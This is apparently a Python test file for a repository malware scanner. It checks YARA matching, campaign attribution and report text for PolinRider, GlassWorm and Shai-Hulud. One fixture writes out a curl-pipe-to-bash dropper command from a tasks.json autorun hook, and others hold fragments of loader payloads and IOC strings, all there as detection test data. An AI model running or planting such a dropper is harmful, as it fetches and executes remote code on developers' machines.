"""PolinRider (OSM-documented DPRK campaign): detection, YARA, attribution, dedup."""

from __future__ import annotations

import csv
import json
from types import SimpleNamespace

from git_warden.osm_submit import build_report
from git_warden.scanning import tier2


def _flag(rule, category, file="postcss.config.mjs", snippet="x"):
    return {"file": file, "line": 6, "category": category, "rule": rule, "snippet": snippet}


def _row(flags):
    return {"full_name": "victim/app", "detection_method": "signature_match", "score": 9,
            "actor_key": None, "first_seen_run": None, "last_seen_run": None,
            "raw_payload": json.dumps({"bash_findings": flags})}


def test_yara_runner_counts_only_payload_files(tmp_path, monkeypatch):
    (tmp_path / "postcss.config.mjs").write_text("x")
    (tmp_path / "README.md").write_text("x")
    monkeypatch.setattr(tier2.shutil, "which", lambda name: "/usr/bin/yara")
    calls = []

    def runner(cmd, **kw):
        calls.append(cmd)
        rules = open(cmd[3], encoding="utf-8").read()
        assert "rule polinrider_payload" in rules and "Cot%3t=shtP" in rules
        return SimpleNamespace(returncode=0, stdout=out)

    out = f"polinrider_payload {tmp_path}/README.md\n"
    assert tier2._run_external("yara", tmp_path, runner) == "clean"  # a write-up is data
    out += f"polinrider_payload {tmp_path}/postcss.config.mjs\n"
    assert tier2._run_external("yara", tmp_path, runner) == "flagged"
    assert calls[0][:3] == ["yara", "-r", "-w"]


def test_yara_runner_reports_errors(tmp_path, monkeypatch):
    monkeypatch.setattr(tier2.shutil, "which", lambda name: "/usr/bin/yara")
    bad = lambda cmd, **kw: SimpleNamespace(returncode=1, stdout="")  # noqa: E731
    assert tier2._run_external("yara", tmp_path, bad) == "error"


def test_polinrider_fingerprint_attributes_probable_and_names_it():
    from git_warden.actors import attribute
    a = attribute([_flag("polinrider-loader", "malware_signature")], None, set())
    assert a.tier == "probable" and a.campaign == "PolinRider"
    assert "polinrider" in a.tags and "dprk" in a.tags


def test_tasks_json_dropper_with_flag_path_is_named_polinrider():
    from git_warden.actors import attribute
    cmd = "curl https://default-configuration.vercel.app/settings/linux?flag=3 | bash"
    a = attribute([_flag("vscode-autorun", "install_hook", ".vscode/tasks.json", cmd)],
                  None, set())
    assert a.campaign == "PolinRider" and "polinrider" in a.tags


def test_report_names_polinrider_and_the_payload():
    r = build_report(_row([_flag("polinrider-loader", "malware_signature",
                                 snippet="global['_V']='8-st12';var MDy=...")]))
    td, pd = r["threat_description"], r["payload_description"]
    assert td.startswith("PolinRider loader (DPRK backdoor/infostealer). "
                         "Payload in postcss.config.mjs.")
    assert "documented by OpenSourceMalware" in td
    assert "- postcss.config.mjs:6: PolinRider shuffle-cipher loader" in pd
    assert r["severity_level"] == "critical"
    assert "polinrider" in r["tags"] and "polinrider-config-injection" in r["tags"]


def test_propagation_script_report():
    r = build_report(_row([_flag("git-history-forgery", "propagation", "temp_auto_push.bat",
                                 "date %LAST_COMMIT_DATE%")]))
    assert r["threat_description"].startswith("PolinRider-compromised repository")
    assert "force-pushes to hide the injection" in r["payload_description"]


def _import_script():
    import importlib.util
    from pathlib import Path
    path = Path(__file__).resolve().parents[1] / "scripts" / "import_osm_known.py"
    spec = importlib.util.spec_from_file_location("import_osm_known", path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_osm_known_reports_are_imported_and_skipped(tmp_path):
    from git_warden import osm_automation as auto
    src = tmp_path / "july10.csv"
    with src.open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh)
        w.writerow(["Repository", "Owner", "OSM Threat ID", "GitHub URL"])
        w.writerow(["Victim/App", "Victim", "3e23fa8c-15a8-4156-84e8-a75678bbec07", ""])
        w.writerow(["bad row", "x", "not-a-uuid", ""])
    out = tmp_path / "osm_known_reports.csv"
    mod = _import_script()
    assert mod.merge([src], out) == {"rows": 1, "added": 1}
    assert mod.merge([src], out) == {"rows": 1, "added": 0}  # idempotent
    skips = auto.evidence_skips(tmp_path)
    assert skips == {"victim/app": "already reported by OSM (osm-polinrider, id 3e23fa8c)"}


def test_glassworm_report_names_the_family():
    r = build_report(_row([_flag("invisible-unicode-payload", "malware_signature",
                                 "src/index.js", "eval(Buffer.from(s(`...`)))")]))
    assert r["threat_description"].startswith(
        "GlassWorm loader (invisible Unicode payload, Solana dead-drop C2)")
    assert "glassworm" in r["tags"] and r["severity_level"] == "critical"


def test_shai_hulud_report_names_the_family():
    r = build_report(_row([_flag("shai-hulud-ioc", "malware_signature",
                                 "package.json", "preinstall: node setup_bun.js")]))
    assert r["threat_description"].startswith("Shai-Hulud worm")
    assert "shai-hulud" in r["tags"]


def test_campaign_signatures_skip_detector_code(tmp_path):
    from git_warden.scanning.content_scanner import scan_content
    d = tmp_path / "scanner"
    d.mkdir()
    (d / "iocs.js").write_text('const W = ["lzcdrtfxyqiplpd", "SHA1HULUD"];\n')
    (tmp_path / "app.py").write_text("lzcdrtfxyqiplpd = 1\n")
    rules = {(f.file, f.rule) for f in scan_content(tmp_path, repo_name="x/app")}
    assert rules == {("app.py", "glassworm-ioc")}
